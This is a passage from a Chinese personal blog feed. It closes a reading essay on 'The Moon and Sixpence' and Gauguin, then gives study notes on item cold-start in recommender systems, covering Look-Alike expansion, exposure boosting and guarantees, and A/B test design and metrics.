关于高更</h1><p>斯特里克兰在生命终结之前创作的这幅画的原型，是一八九七年高更在塔希提岛创作的巨作：《我们从哪里来？我们是谁？我们到哪里去？》斯特里克兰的人物原型是后印象派巨匠之一的高更。</p><p>高更早年在海轮上工作，后来又到法国海军中服务，二十三岁当上了股票经纪人，收入丰厚，还娶了一位漂亮的丹麦姑娘为妻。他的正业虽是如此，但早在一八七三年就开始画画，并收藏印象派画家作品。一八八二年股市大崩盘，在自己绘画天赋的召唤之下，三十五岁的高更毅然辞去了股票经纪人的工作，专心致力于绘画，三十八岁时与家庭基本断绝了关系，长期过着孤独的生活。一八九一年至一八九三年，以及一八九五年至一九零一年，高更曾两度前往塔希提岛，长期居住并进行创作。这些都和斯特里克兰多少相似。但与小说中的斯特里克兰不同的是，高更没有得麻风病，也没有失明，更没有完全断绝与世俗世界的联系，他始终在与妻子通信，抱怨缺钱以及生活的艰难，特别是，他不断将在塔希提创作完成的作品运回巴黎，挂进画廊出售，虽然很不理想。</p><p>一八九七年，高更的生活贫困潦倒，又患上了严重的疾病，当他最爱的小女儿艾琳因肺炎死亡的消息传来，他的精神彻底崩溃了。他服毒自杀，想彻底结束自己的生命，可是自杀未遂。这次事件后，他带着沉积已久的激情，创作了巨幅油画《我们从哪里来？我们是谁？我们到哪里去？》。对此，高更曾说：“我希望能在临死之前完成一幅巨作。在整整一个月内，我几乎不分昼夜地以我前所未有的热情从事创作。我完全不用模特儿，在粗糙的麻袋布上直接作画，以至于看来十分粗糙，笔触相当草率，恐怕会被认为是未完成的作品。确实，我自己也无法十分明确地断定。可是我认为这幅画比我以前的任何作品都要优秀。今后也许再也画不出比它更好的或同样好的作品了。我在死之前把我全部精力都倾注在这幅作品中了。这幅画是高更的巅峰之作，正因为最具代表性，毛姆才借用它来安排斯特里克兰的最终命运。</p><p><img src="/2024/10/25/%E8%AF%BB%E4%B9%A6%E8%AE%B0%E5%BD%952%EF%BC%9A%E6%9C%88%E4%BA%AE%E4%B8%8E%E5%85%AD%E4%BE%BF%E5%A3%AB/image_khjM3292DG.png"></p><p>这幅作品在远离文明世界的塔希提创作，将人类的原始记忆、宗教信仰和凡俗生活进行了完整的提炼和浓缩。这种追问，既是一种来自精神的伟大哲思，也是人类情感记忆的凝结，最终生命通过艺术得以升华，从而达到最高的精神涅槃。</p><p>我们从哪里来？我们是谁？我们到哪里去？这是最终极的精神追问。当人类的精神性抵达了它自身，它便超越了自我与他人、肉体与灵魂，它就在它自身中守护住它自身并且为了这个自身而存在，不再需要任何物质性的东西，哪怕是所谓的艺术杰作。这正是艺术创作的心声：当你完成了最伟大的作品，它便离你而去，因为艺术的最高诉求并非任何实体，而是那遥不可及的精神的涅槃。付之一炬正是涅槃的象征。和高更相比，斯特里克兰的死和他的杰作的毁灭更显得撼动人心，这正是小说的高明与真实之处。</p><hr><h1 id="4-理想与现实"><a href="#4-理想与现实" class="headerlink" title="4 理想与现实"></a>4 理想与现实</h1><p>对于当代社会而言，它是一面映照现实的镜子，警示人们切勿在物欲横流中迷失自我，忽略内心真正的渴望。同时，也提醒人们在追求梦想的过程中，要有勇气面对可能的孤独和牺牲。</p><p>理想与现实总是相差十万八千里，需要你怀着坚定的信念一点一点的追寻。就像斯特里克兰德先生一样。  想要追求心中的梦想，但这梦想与自己所处的现实格格不入。在度过了十几年的婚姻生活后，毅然决然离开妻子儿女去巴黎画画，宁可忍受身体的各种困苦，甚至精神上的孤独寂寞。</p><p>书中有三种追寻自己梦想的生活状态，这三种生活状态体现了不同的价值观。同时，也映射着我们每一个人，在寻求自己心中的月亮时，所面临的不同的生活状态。</p><p>当你看懂了月亮与六便士，你就走出了焦虑。</p><p><img src="/2024/10/25/%E8%AF%BB%E4%B9%A6%E8%AE%B0%E5%BD%952%EF%BC%9A%E6%9C%88%E4%BA%AE%E4%B8%8E%E5%85%AD%E4%BE%BF%E5%A3%AB/image_2Eexwa6lPQ.png"></p><blockquote><p>极致表达自己内心的感受，即便是饿其体肤，空乏其身也在所不惜</p></blockquote><p>斯德里克兰德先生在40岁的某一天，给妻子留下一封信，独自来到巴黎一个阴暗的小旅馆画画，从此开始了对梦想的追求。他在潮湿阴暗的小旅馆里忍饥挨饿；在游轮上，他为一口吃的沦为搬运工；在塔西提岛，他身患麻风病也不曾搁下画笔。</p><p>满地都是六便士，他却抬头看见了月亮。</p><p>为了追求心中的月亮，他宁可抛家舍业，身心备受摧残，甚至生命的最后时刻依然为自己的画追求最高境界。这种极致的生活极少有人能做到，甚至会有人认为这是自讨苦吃。因此，最好在理想与现实这两点之间寻找到一个平衡点，既支撑你做自己的成长状态，又能兼顾家庭生活。</p><p>在这一点上，很佩服冯唐先生所说的在生活与工作之间切换自如。怎么做到的？他分享了自己工作和生活中的 4 点体会。</p><ol><li><strong>有所逼</strong>：你想做什么刚开始肯定是要逼一逼自己的，否则你习惯性的做法和思维不可能达到你想要的状态。你想读书，那你就要想办法让自己静下来，逼自己每天读两页书。</li><li><strong>有所专</strong>：这个指专心和专业。你选择一个自己喜欢或熟悉的领域，排除一切干扰，专心的做这个领域。沉下去，不要人云亦云。</li><li><strong>有所规</strong>：给自己立一个规矩，或者规范。让自己每天按照这个规矩行事，容易形成良好的习惯。</li><li><strong>有所贪</strong>：贪其实不是坏东西，贪代表一个人的欲望，如果一个人连欲望都没有，何谈获得？</li></ol><p>只是贪应用在你自己认为能够提升自身能力的事情上。所以从某一个角度来说，我们有时候不但要有斯特里克兰德先生的决绝，还要有内心的一种贪念。</p><p>这种贪念会支撑着我们为心中的梦想持续不断努力，真正的向自己的目标靠近。</p><hr><h1 id="5-吾心安处是故乡"><a href="#5-吾心安处是故乡" class="headerlink" title="5 吾心安处是故乡"></a>5 吾心安处是故乡</h1><p>亚伯拉罕是个才华出众的犹太人。大学毕业后，他进入一家知名医院做外科医生，前程一片光明。但正式上班前的一次旅行，让他脱离了世俗的轨道——他放弃了众人艳羡的职位，在亚历山大的政府部门做了个地位低微的卫生检疫员。</p><p>毕业十年后，“我”偶遇亚伯拉罕。他衣着寒酸，生活拮据，头顶秃得厉害，娶了一个丑陋的希腊女人。但亚伯拉罕说，他从来不后悔自己的选择。十年前，当他乘坐的货船在亚历山大港停靠的时候，望着这个城市，他突然感到无比自由，觉得这里才是他的故乡。</p><p>正所谓“吾心安处是故乡”，于是在不到一分钟时间内，他做出决定要在亚历山大度过余生。</p><p>亚伯拉罕说，自己挣的钱不多，但过日子够用，“这辈子过得无比美妙”，别无所求。亚伯拉罕辞职后，他的同学亚力克接了他的岗位。亚力克功成名就，娶了一个美丽的妻子，一年有一万镑的收入。在他眼里，亚伯拉罕是个浪掷才华的可怜家伙。他性格乖张，糟蹋了自己的人生。</p><p>此时，毛姆发出了灵魂提问，</p><p><strong>“难道去做自己最想做的事情、生活在你最怡然自得的环境中，心平气和、淡泊宁静就是把人生糟蹋了吗？难道成为一位著名的外科医生、年入上万英镑、娶得如花美眷就算是成功吗？”</strong></p><p>“世俗意义上的成功”和“淡泊宁静的心灵生活”究竟应该选择哪个？</p><p>跟亚伯拉罕一样，斯特里克兰也离开了巴黎，找到了一个可以平静度过余生的地方——塔西提岛。在这里他娶了一个淳朴的土著姑娘，过着世外桃源般的生活。在别人眼里，他是个游手好闲的懒汉，每天画一些别人看不懂的画，但他毫不在意。在这里，他完成了自己的使命——创作出此生最重要的画作。</p><p>他死后，人们才发现他是个天纵奇才，他的画妙不可言又神秘莫测。虽然生命的最后几年他身患麻风病，双目失明，深受病痛和贫穷的折磨，但<strong>他从未抱怨过命运，从未丧失过勇气。直到生命最后一刻，他的心灵都是安详而又镇定的。</strong></p><p>亚伯拉罕和斯特里克兰在很多人眼里不可理喻。但“子非鱼，安知鱼之乐？”各人有各人的追求，各人有各人的选择，最终是求仁得仁的结果而已。</p><p>唯一可以确定的是，淡泊宁静的生活和心灵的富足唾手可得，世俗意义上的成功永远没有尽头。</p><p>对于世俗中的我们，不可能像斯特里克兰一样，放下一切去追寻心中的月亮。但在追求六便士的路上，我们可以选择同时安顿好自己的心灵。勿忘初心，“心安”就是最成<strong>功的人生状态！</strong></p><p>难的是，如何安顿这颗躁动的心，“心安”之处究竟在何方？</p><p><img src="/2024/10/25/%E8%AF%BB%E4%B9%A6%E8%AE%B0%E5%BD%952%EF%BC%9A%E6%9C%88%E4%BA%AE%E4%B8%8E%E5%85%AD%E4%BE%BF%E5%A3%AB/image_Nd3drt6QlH.png"></p><hr><h1 id="6-去追求你的月亮"><a href="#6-去追求你的月亮" class="headerlink" title="6 去追求你的月亮"></a>6 去追求你的月亮</h1><p>《月亮和六便士》确实为很多人解决了人生的疑难。</p><p>“我们每个人生在世界上都是孤独的。每个人都被囚禁在一座铁塔里，只能靠一些符号同别人传达自己的思想……我们非常可怜地想把自己心中的财富传送给别人，但是他们却没有接受这些财富的能力。因此我们只能孤独地行走，尽管身体相互依傍却并不在一起，既不了解别的人，也不能为别人所了解。”</p><p>“我承认这种生活（世俗眼中的安稳）的社会价值，我也看到了它的井然有序的幸福……但我的心，渴望一种更加惊险的生活。”</p><p>一个人应该怎样生活，应该是自己的选择。</p><p>《月亮和六便士》的斯特里克兰德，按照世俗的标准，他抛妻弃子不负责任，可是抛开世俗的标准，他选择自己想要的生活，又有什么错？</p><p>作家蔡崇达（《皮囊》的作者）读后说：“这本书（《月亮和六便士》）让我明白，如果我一辈子不忠于自己内心的声音的话，我可能一辈子都不会开心。”</p><p>当人生面临选择的时候，不仅需要勇气，还要听从自己的内心。只有忠于自己内心的声音，找到真正的自己，人生才会快乐，也便不会有遗憾。</p><p>什么是生活？生活的意义是什么？这些没有人能真正告诉你，需要你自己满怀勇气，像小说主人公那样抛弃一切，用整个灵魂去探索。在这个以物质为上帝的时代，用浅薄的幸福、成功来量死你的世界，你该怎样过完你的人生？人生如梦，你是希望枕着月亮还是六便士？很多人渴望名声，追求利益，很多人希望名利双收；大多数人按部就班，过着平庸乏味的生活；也有一些人忽然如梦方醒，一骨碌爬起，去寻找真正有价值的生活。</p><p>希望我能在追逐六便士的时候，也能拥有心中的月亮，全力以赴，过好自己的每个当下的人生。</p><hr><h1 id="7-个人感受"><a href="#7-个人感受" class="headerlink" title="7 个人感受"></a>7 个人感受</h1><p>我可以为我的理想拼尽一切，我也期待为了我的理想拼尽一切。仿佛此刻我的世界里只有那闪闪发光的月亮，就是此刻，属于我的时间已经到来了，属于我的命运已经到来了，属于我的灵魂已经逐渐变得自由了。</p><p>我希望我的灵魂变得更加厚实、丰满，飞到我的肉体到达不了的地方，飞到属于我的塔西提岛✌。</p>]]></content>
      
      
      <categories>
          
          <category> 读书记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 读书记录 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WSS推荐系统学习笔记10：物品冷启动2</title>
      <link href="/2024/10/24/WSS%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B010%EF%BC%9A%E7%89%A9%E5%93%81%E5%86%B7%E5%90%AF%E5%8A%A82/"/>
      <url>/2024/10/24/WSS%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B010%EF%BC%9A%E7%89%A9%E5%93%81%E5%86%B7%E5%90%AF%E5%8A%A82/</url>
      
        <content type="html"><![CDATA[<h1 id="1-Look-Alike-人群扩散"><a href="#1-Look-Alike-人群扩散" class="headerlink" title="1 Look-Alike 人群扩散"></a>1 Look-Alike 人群扩散</h1><h2 id="1-1-在互联网广告中的应用"><a href="#1-1-在互联网广告中的应用" class="headerlink" title="1.1 在互联网广告中的应用"></a>1.1 在互联网广告中的应用</h2><p>Look-Alike 起源于互联网广告。假设一个广告主是特斯拉，它们知道Tesla Model 3 典型用户有以下特点：</p><ul><li>年龄 25~35</li><li>本科学历以上</li><li>关注科技数码</li><li>喜欢苹果电子产品</li></ul><p>把具有上述特点的用户给圈起来，重点在这些用户中投放广告。满足所有条件的用户被称为种子用户，这样的用户数量不是很多。广告主想给一百万个人投放广告，但是我们只圈出几万人，该如何找到其他的目标用户？</p><p>可以用到 Look-Alike 人群扩散，对种子用户进行人群扩散找到 Look-Alike 用户，Look-Alike 是一个框架，如何进行扩散，有各种各样的方法。</p><p><img src="/2024/10/24/WSS%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B010%EF%BC%9A%E7%89%A9%E5%93%81%E5%86%B7%E5%90%AF%E5%8A%A82/image_oLjjCWEet5.png"></p><p>最重要的问题在于如何计算两个用户的相似度，有一些简单的方法：</p><ul><li>UserCF：两个用户有共同的兴趣点</li><li>Embedding：两个用户向量的cosine较大</li></ul><h2 id="1-2-用于新笔记召回"><a href="#1-2-用于新笔记召回" class="headerlink" title="1.2 用于新笔记召回"></a>1.2 用于新笔记召回</h2><p>在冷启动中，如果用户有点击、点赞、收藏、转发等行为，说明用户对笔记可能感兴趣。把有交互的用户作为新笔记的种子用户，如果一个用户和种子用户相似，可以把这个笔记推荐给他，用 Look-Alike 在相似用户中扩散。</p><p>系统对新笔记的推荐不太准，有交互行为的用户数量很少，一旦有交互行为，我们要充分利用这种信号，可以把这些有交互行为的用户向量取均值得到一个新向量，把这个新向量作为该笔记的特征向量。</p><p><img src="/2024/10/24/WSS%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B010%EF%BC%9A%E7%89%A9%E5%93%81%E5%86%B7%E5%90%AF%E5%8A%A82/image_jB9ut7ApkX.png"></p><p>这个特征向量是做近线更新的，意思就是不用实时进行更新，能做到分钟级更新即可。这个特征向量是有交互的用户的向量的平均，每当有用户交互该物品，更新笔记的特征向量。</p><p><strong>线上召回</strong>：把新笔记的特征向量都放在向量数据库里，向量数据库通常支持最近邻查找。之后用户发出推荐请求时，拿用户的特征向量作为 $query$ 在向量数据库中做最近邻查找，取回几十篇笔记，这个过程叫做 Look-Alike。</p><p><img src="/2024/10/24/WSS%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B010%EF%BC%9A%E7%89%A9%E5%93%81%E5%86%B7%E5%90%AF%E5%8A%A82/image_9d6IQ3PHVv.png"></p><hr><h1 id="2-流量调控"><a href="#2-流量调控" class="headerlink" title="2 流量调控"></a>2 流量调控</h1><p><strong>冷启动的优化点：</strong></p><ol><li>优化全链路（包括召回和排序）</li><li>流量调控（流量怎么在新物品、老物品中分配）</li></ol><p>为什么给新笔记流量倾斜？扶持新笔记的目的如下：</p><ol><li><strong>促进发布，增大内容池</strong>：新笔记获得的曝光越多，作者创作积极性越高，反映在发布渗透率、人均发布量。</li><li><strong>挖掘优质笔记</strong>：做探索，让每篇新笔记都能获得足够曝光，挖掘的能⼒反映在高热笔记占比。</li></ol><p>举例说明工业界大致怎么对新发布的物品做扶持。假设推荐系统只分发年龄 &lt; 30 天的笔记，假设采用自然分发，则新笔记（年龄 &lt; 24 小时）的曝光占比为 $\frac{1}{30}$<strong>。</strong>因此要扶持新笔记，让新笔记的曝光占比远大于 $\frac{1}{30}$。</p><p>流量调控技术的发展：</p><ol><li>在推荐结果中强插新笔记（最原始）</li><li>对新笔记的排序分数做提权（boost）</li><li>通过提权，对新笔记做保量</li><li>差异化保量</li></ol><h2 id="2-1-新笔记提权（boost）"><a href="#2-1-新笔记提权（boost）" class="headerlink" title="2.1 新笔记提权（boost）"></a>2.1 新笔记提权（boost）</h2><p><img src="/2024/10/24/WSS%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B010%EF%BC%9A%E7%89%A9%E5%93%81%E5%86%B7%E5%90%AF%E5%8A%A82/image_4pjI0rgs8m.png"></p><p>给新笔记提权的目标是让新笔记有更多机会曝光。如果做自然分发，24 小时新笔记占比为 $\frac{1}{30}$。因此做人为干涉，让新笔记占比大幅提升。粗排和重排都是漏斗，如果要做人为干涉，一般时干涉粗排、重排环节，给新笔记提权。</p><p>优点是容易实现，投⼊产出比好，在前期没有足够多的人力的时候这种方案比较好。</p><p>缺点：</p><ol><li>曝光量对提权系数很敏感</li><li>很难精确控制曝光量，容易过度曝光和不充分曝光</li></ol><h2 id="2-2-新笔记保量"><a href="#2-2-新笔记保量" class="headerlink" title="2.2 新笔记保量"></a>2.2 新笔记保量</h2><p><strong>保量</strong>：对于一篇新笔记，不论笔记质量高低，都保证在前 24 小时获得 100 次曝光。最原始的保量是在原有提权系数的基础上，乘以额外的提权的系数，需要差异化对待不同的曝光时间，比如：</p><p><img src="/2024/10/24/WSS%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B010%EF%BC%9A%E7%89%A9%E5%93%81%E5%86%B7%E5%90%AF%E5%8A%A82/image_Nr_qEWtMTx.png"></p><h3 id="2-2-1-动态提权保量"><a href="#2-2-1-动态提权保量" class="headerlink" title="2.2.1 动态提权保量"></a>2.2.1 动态提权保量</h3><p>动态提权保量是更先进的保量方法，可以用下面四个值计算提权系数：</p><ul><li>目标时间：比如 24 小时</li><li>目标曝光：比如 100 次</li><li>发布时间：比如笔记已经发布 12 小时</li><li>已有曝光：比如笔记已经获得 20 次曝光</li></ul><p>$$<br>提权系数 &#x3D;f\left(\frac{\text { 发布时间 }}{\text { 目标时间 }},\frac{\text { 已有曝光 }}{\text { 目标曝光 }}\right)&#x3D;f(0.5,0.2)<br>$$</p><h3 id="2-2-2-保量的难点"><a href="#2-2-2-保量的难点" class="headerlink" title="2.2.2 保量的难点"></a>2.2.2 保量的难点</h3><blockquote><p>保量成功率远低于 100%</p></blockquote><p>实际操作中，很多笔记在 24 小时达不到 100 次曝光。造成效果不好的原因有很多，可能在推荐链路上存在问题，比如召回、排序存在不足。也有可能是排序模型的问题，对新笔记的预估不准。还有可能提权系数调得不好，导致曝光不足。</p><p>此外线上环境变化也会导致保量失败，例如新增召回通道、升级排序模型、改变重排打散规则。线上环境变换之后，往往需要调整提权系数，很麻烦。</p><p>是否可以给所有新笔记⼀个很大的提权系数（比如 4 倍），直到达成 100 次曝光为止。这样的保量成功率很高，为什么不用这种方法呢？是否给新笔记分数 boost 越多，对新笔记越有利？</p><p>好处：分数提升越多，曝光次数越多。</p><p>坏处：把笔记推荐给不太合适的受众。</p><ul><li>点击率、点赞率等指标会偏低</li><li>长期会受推荐系统打压，难以成长为热门笔记</li></ul><h2 id="2-3-差异化保量"><a href="#2-3-差异化保量" class="headerlink" title="2.3 差异化保量"></a>2.3 差异化保量</h2><p><strong>简单的保量</strong>不论新笔记质量高低，都做扶持，在前 24 小时给 100 次曝光。<strong>差异化保量有区别，</strong>不同笔记有不同保量目标，普通笔记保 100 次曝光，内容优质的笔记保 100~500 次曝光。</p><p>差异化保量保证每篇笔记都有一个基础保量，比如 24 小时 100 次曝光。依据是笔记内容质量和作者质量。</p><ul><li>内容质量：用模型评价内容质量高低，给予额外保量目标，上限是加 200 次曝光。</li><li>作者质量：根据作者历史上的笔记质量，给予额外保量目标，上限是加 200 次曝光。</li></ul><p>那么⼀篇笔记在前 24 次小时最少有 100 次保量，最多有 500 次保量。达到保量目标之后就会停止扶持，让新笔记自由分发，跟老笔记公平竞争。</p><hr><h1 id="3-冷启的-AB-测试"><a href="#3-冷启的-AB-测试" class="headerlink" title="3 冷启的 AB 测试"></a>3 冷启的 AB 测试</h1><p>在冷启的 AB 测试中，既要看作者侧指标，也要看用户侧指标。其中作者侧指标包括发布渗透率、人均发布量，这些指标可以反映作者的发布意愿。用户侧指标包括对新笔记的点击率、交互率。</p><p>除此之外，还要看大盘指标：消费时长、日活、月活。不希望冷启推荐的新笔记引起用户的反感，导致用户不活跃。</p><p>推荐系统标准的冷启测试如下，把用户分为两组，每组包含 $50\%$ 的用户，上面是实验组，下面是对照组，右边是全体的笔记，不分组。在给实验组的用户做推荐的时候使用新的策略，给对照组的用户做推荐使用旧的策略。</p><p>在实验的过程中，对比两组消费指标的 diff。</p><p><img src="/2024/10/24/WSS%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B010%EF%BC%9A%E7%89%A9%E5%93%81%E5%86%B7%E5%90%AF%E5%8A%A82/image_3rbuYIgiS1.png"></p><h2 id="3-1-用户侧实验"><a href="#3-1-用户侧实验" class="headerlink" title="3.1 用户侧实验"></a>3.1 用户侧实验</h2><p>例如要考察策略对新笔记点击率或用户消费时长的影响，这种方法有个缺点：假设冷启要求做保量，要至少给新笔记 100 次曝光。还做个假设，新笔记曝光越多，用户使用 APP 时长越低。</p><p>现在使用一个新策略，即把新笔记排序时的权重增大两倍，这样让新笔记能获得更多的曝光。很明显这样的测试结果（只看消费指标）肯定会变差，AB 测试的 diff 是负数（策略组不如对照组）。如果推全，实际上的 diff 会缩小（比如 $-2\%$ → $-1\%$）。</p><p>为什么会变小？因为在做实验的时候，新笔记更多的曝光给实验组，导致实验组的消费指标变差，同时新笔记更少的曝光给对照组，所以对照组的消费指标会变好，所以实验组和对照组的 diff 会变得更大。所以在推全之后，这个 diff 相对于原来会变小。</p><p><img src="/2024/10/24/WSS%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B010%EF%BC%9A%E7%89%A9%E5%93%81%E5%86%B7%E5%90%AF%E5%8A%A82/image_nOrdxaLGXA.png"></p><h2 id="3-2-作者侧实验"><a href="#3-2-作者侧实验" class="headerlink" title="3.2 作者侧实验"></a>3.2 作者侧实验</h2><h3 id="3-2-1-方案一"><a href="#3-2-1-方案一" class="headerlink" title="3.2.1 方案一"></a>3.2.1 方案一</h3><p>不对全体老笔记和用户做分组，但是要区别对待新笔记和老笔记。将新笔记按照作者分为两组，上面是实验组使用新策略，下面是对照组，使用老策略。</p><p>缺点在于新笔记之间会抢流量，比如在测试的时候发布指标涨了 $2\%$，但是在推全之后并没有什么变化。首先设定：</p><ol><li>新老笔记走各自队列，新老笔记没有竞争</li><li>重排分给新笔记 1&#x2F;3 流量，分给老笔记 2&#x2F;3 流量</li></ol><p>现在上一个新策略，把新笔记的权重增大两倍。在这种策略下没有任何变化，因为新笔记只和新笔记竞争，把所有新笔记的权重扩大两倍，相当于没有扩大，所以不会改变发布侧指标。但是 A&#x2F;B 测试的 diff 是正数（策略组优于对照组），显示有正向收益，这是不合理的。</p><p>实验组给新笔记提权，对照组没有提权，那么实验组的新笔记会抢走对照组的曝光，因此实验组的发布指标会涨，对照组的发布指标会跌，这就产生了 diff。很显然，把新策略推全之后，diff 会消失（比如 $2\%$ → 0）。</p><p><img src="/2024/10/24/WSS%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B010%EF%BC%9A%E7%89%A9%E5%93%81%E5%86%B7%E5%90%AF%E5%8A%A82/image_MNmqKeWlkh.png"></p><h3 id="3-2-2-方案二"><a href="#3-2-2-方案二" class="headerlink" title="3.2.2 方案二"></a>3.2.2 方案二</h3><p>方案二和方案一的区别在于用户被分成了两组，上面是实验组，下面是对照组，实验组的用户只能看到实验组的新笔记，对照组的用户只能看到对照组的新笔记。</p><p>方案二比方案一的优缺点：</p><ol><li>优点：新笔记的两个桶不抢流量，作者侧实验结果更可信</li><li>缺点：新笔记池减小⼀半，推荐结果变差，对用户体验造成负面影响</li></ol><p>相同：新笔记和老笔记抢流量，作者侧 A&#x2F;B 测试结果与推全结果有些差异。</p><p><img src="/2024/10/24/WSS%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B010%EF%BC%9A%E7%89%A9%E5%93%81%E5%86%B7%E5%90%AF%E5%8A%A82/image_UZDQ47Jt9J.png"></p><h3 id="3-2-3-方案三"><a href="#3-2-3-方案三" class="headerlink" title="3.2.3 方案三"></a>3.2.3 方案三</h3><p>这种方案不太可行，相当于把小红书分为两个 APP，内容质量减半，消费指标一定会大跌。</p><p><img src="/2024/10/24/WSS%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B010%EF%BC%9A%E7%89%A9%E5%93%81%E5%86%B7%E5%90%AF%E5%8A%A82/image_FPQgpJ8uNN.png"></p><h2 id="3-3-总结"><a href="#3-3-总结" class="headerlink" title="3.3 总结"></a>3.3 总结</h2><p>冷启的AB测试需要观测作者发布指标和用户消费指标，这是因为冷启有两个目标，一个是激励作者发布，另一个是让用户满意。</p><p>各种AB测试的方案都有缺陷。设计方案的时候，问自⼰⼏个问题：</p><ul><li>实验组、对照组新笔记会不会抢流量？</li><li>新笔记、老笔记怎么抢流量？</li><li>同时隔离笔记、用户，会不会让内容池变小？</li><li>如果对新笔记做保量，会发⽣什么？</li></ul>]]></content>
      
      
      <categories>
          
          <category> 推荐系统 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 推荐系统 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WSS推荐系统学习笔记9：物品冷启动1</title>
      <link href="/2024/10/22/WSS%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B09%EF%BC%9A%E7%89%A9%E5%93%81%E5%86%B7%E5%90%AF%E5%8A%A81/"/>
      <url>/2024/10/22/WSS%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B09%EF%BC%9A%E7%89%A9%E5%93%81%E5%86%B7%E5%90%AF%E5%8A%A81/</url>
      
        <content type="html"><![CDATA[<h1 id="1-优化目标-评价指标"><a href="#1-优化目标-评价指标" class="headerlink" title="1 优化目标&amp;评价指标"></a>1 优化目标&amp;评价指标</h1><p>UGC 比 PGC 更难，因为用户上传的内容质量良莠不齐，而且量很大，很难用人工去评判，很难让运营人员去调控。</p><p>为什么要特殊对待新笔记？因为新笔记刚刚那个发布，缺少与用户的交互，导致推荐的难度大、效果差。此外，扶持新发布、低曝光的笔记，可以增强作者发布意愿。</p><p>优化冷启的目标：</p><ol><li><strong>精准推荐</strong>：克服冷启的困难，把新笔记推荐给合适的用户，不引起用户反感。</li><li><strong>激励发布</strong>：流量向低曝光新笔记倾斜，激励作者发布。</li><li><strong>挖掘高潜</strong>：通过初期小流量的试探，找到高质量的笔记，给予流量倾斜。</li></ol><p>冷启动的评价指标主要包含作者侧、用户侧和内容侧：</p><ol><li>作者侧指标：发布渗透率、人均发布量。</li><li>用户侧指标：<ul><li>新笔记指标：新笔记的点击率、交互率。</li><li>大盘指标：消费时长、日活、月活。</li></ul></li><li>内容侧指标：高热笔记占比，可以反应出冷启是否能挖掘出优质笔记。</li></ol><p>作者侧和用户侧指标是工业界通用的，技术比较好的大厂都会用这两类指标。内容侧指标只有少数几家在用。</p><p>冷启动的优化点为优化全链路（包括召回和排序）和流量调控（流量怎么在新物品、老物品中分配）。</p><h2 id="1-1-作者侧指标"><a href="#1-1-作者侧指标" class="headerlink" title="1.1 作者侧指标"></a>1.1 作者侧指标</h2><p>作者侧指标主要有发布渗透率和人均发布量。</p><h3 id="1-1-1-发布渗透率"><a href="#1-1-1-发布渗透率" class="headerlink" title="1.1.1 发布渗透率"></a>1.1.1 发布渗透率</h3><blockquote><p>发布渗透率 &#x3D; 当日发布人数 &#x2F; 日活人数</p></blockquote><p>在某一天，用户成为作者的比例就称为<strong>发布渗透率</strong>。一个用户只要发布⼀篇或以上，就算⼀个发布人数。</p><p>例如，当日发布人数 &#x3D; 100万，日活人数 &#x3D; 2000万，则发布渗透率 &#x3D; 100 &#x2F; 2000 &#x3D; 5%。</p><h3 id="1-1-2-人均发布量"><a href="#1-1-2-人均发布量" class="headerlink" title="1.1.2 人均发布量"></a>1.1.2 人均发布量</h3><blockquote><p>人均发布量 &#x3D; 当日发布笔记数 &#x2F; 日活人数</p></blockquote><p>例如，每日发布笔记数 &#x3D; 200万，日活人数 &#x3D; 2000万，则人均发布量 &#x3D; 200 &#x2F; 2000 &#x3D; 0.1。</p><p>有时，一个作者一天可能发布多个笔记，这不影响发布渗透量，但是会影响人均发布量。</p><p>发布渗透率、人均发布量反映出作者的发布积极性。冷启的重要优化目标是提高作者的积极性，促进发布，增大内容池。新笔记获得的曝光越多，首次曝光和交互出现得越早，作者发布积极性越高。所以要把流量向新笔记倾斜，让新笔记获得更多的曝光。同时也要优化新笔记的链路，让新笔记出现交互尽量快。</p><h2 id="1-2-用户侧指标"><a href="#1-2-用户侧指标" class="headerlink" title="1.2 用户侧指标"></a>1.2 用户侧指标</h2><p>用户侧指标主要有新笔记的消费指标和大盘指标。</p><h3 id="1-2-1-新笔记的消费指标"><a href="#1-2-1-新笔记的消费指标" class="headerlink" title="1.2.1 新笔记的消费指标"></a>1.2.1 新笔记的消费指标</h3><p>新笔记的的消费指标主要有点击率、交互率。但是由于曝光的基尼系数很大，少数头部新笔记占据了大部分的曝光。整体的消费指标不能反映出大部分新笔记的情况。</p><p>所以最好是把高曝光和低曝光新笔记分开，分别考察它们的消费指标：</p><ul><li>高曝光：比如 &gt; 1000 次曝光</li><li>低曝光：比如 &lt; 1000 次曝光</li></ul><h3 id="1-2-2-大盘消费指标"><a href="#1-2-2-大盘消费指标" class="headerlink" title="1.2.2 大盘消费指标"></a>1.2.2 